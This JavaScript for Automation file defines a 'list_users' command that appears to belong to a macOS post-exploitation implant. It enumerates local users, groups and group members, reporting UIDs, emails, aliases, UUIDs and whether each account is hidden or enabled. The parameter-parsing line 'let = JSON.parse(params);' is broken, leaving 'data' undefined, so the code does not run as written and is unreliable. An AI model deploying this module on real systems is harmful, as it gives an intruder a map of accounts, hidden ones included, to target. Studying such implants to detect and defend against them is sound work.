exports.list_users = function(task, command, params){
	let all_users = [];
	let method = "api";
	let gid = -1;
	let groups = false;
	if(params.length > 0){
	    let = JSON.parse(params);
        if(data.hasOwnProperty('method') && data['method'] !== ""){
            method = data['method'];
        }
        if(data.hasOwnProperty('gid') && data['gid'] !== ""){
            gid = data['gid'];
        }
        if(data.hasOwnProperty("groups") && data['groups'] !== ""){
            groups = data['groups'];
        }
	}
	if(method === "jxa"){
		let users = Application("System Events").users;
		for (let i = 0; i < users.length; i++){
			let info = "Name: " + users[i].name() +
			"\nFullName: " + users[i].fullName() +
			"\nhomeDirectory: " + users[i].homeDirectory() +
			"\npicturePath: " + users[i].picturePath();
			all_users.push(info);
		}
		return JSON.stringify({"user_output":JSON.stringify(all_users, null, 2), "completed": true});
	}
	else if(method === "api"){
        ObjC.import('Collaboration');
        ObjC.import('CoreServices');
        if(gid === -1){
            let defaultAuthority = $.CSGetLocalIdentityAuthority();
            let identityClass = 2;
            if(groups){
                all_users = {}; // we will want to do a dictionary so we can group the members by their GID
            }
            else{
                identityClass = 1; //enumerate users
            }
            let query = $.CSIdentityQueryCreate($(), identityClass, defaultAuthority);
            let error = Ref();
            $.CSIdentityQueryExecute(query, 0, error);
            let results = $.CSIdentityQueryCopyResults(query);
            let numResults = parseInt($.CFArrayGetCount(results));
            results = results.js;
            for(let i = 0; i < numResults; i++){
                let identity = results[i];
                let idObj = $.CBIdentity.identityWithCSIdentity(identity);
                if(groups){
                    //if we're looking at groups, then we have a different info to print out
                    all_users[idObj.posixGID] = [];
                    let members = idObj.memberIdentities.js;
                    for(let j = 0; j < members.length; j++){
                        let info = "POSIXName(ID): " + members[j].posixName.js + "(" + members[j].posixUID + "), LocalAuthority: " +  members[j].authority.localizedName.js + ", fullName: " + members[j].fullName.js +
                        "\nEmails: " + members[j].emailAddress.js + ", isHiddenAccount: " + members[j].isHidden + ", Enabled: " + members[j].isEnabled + ", Aliases: " + ObjC.deepUnwrap(members[j].aliases) + ", UUID: " + members[j].UUIDString.js + "\n";
                        all_users[idObj.posixGID].push(info);
                    }
                }
                else{
                    let info = "POSIXName(ID): " + idObj.posixName.js + "(" + idObj.posixUID + "), LocalAuthority: " +  idObj.authority.localizedName.js + ", fullName: " + idObj.fullName.js +
                    "\nEmails: " + idObj.emailAddress.js + ", isHiddenAccount: " + idObj.isHidden + ", Enabled: " + idObj.isEnabled + ", Aliases: " + ObjC.deepUnwrap(idObj.aliases) + ", UUID: " + idObj.UUIDString.js + "\n";
                    all_users.push(info);
                }
            }
        }
        else{
            let defaultAuthority = $.CBIdentityAuthority.defaultIdentityAuthority;
            let group = $.CBGroupIdentity.groupIdentityWithPosixGIDAuthority(gid, defaultAuthority);
            let results = group.memberIdentities.js;
            let numResults = results.length;
            for(let i = 0; i < numResults; i++){
                let idObj = results[i];
                let info = "POSIXName(ID): " + idObj.posixName.js + "(" + idObj.posixUID + "), LocalAuthority: " +  idObj.authority.localizedName.js + ", fullName: " + idObj.fullName.js +
                "\nEmails: " + idObj.emailAddress.js + ", isHiddenAccount: " + idObj.isHidden + ", Enabled: " + idObj.isEnabled + ", Aliases: " + ObjC.deepUnwrap(idObj.aliases) + ", UUID: " + idObj.UUIDString.js + "\n";
                all_users.push(info);
            }
        }
        return JSON.stringify({"user_output":JSON.stringify(all_users, null, 2), "completed": true});
	}
	else{
	    return JSON.stringify({"user_output":"Method not known", "completed": true, "status": "error"});
	}
};
COMMAND_ENDS_HERE
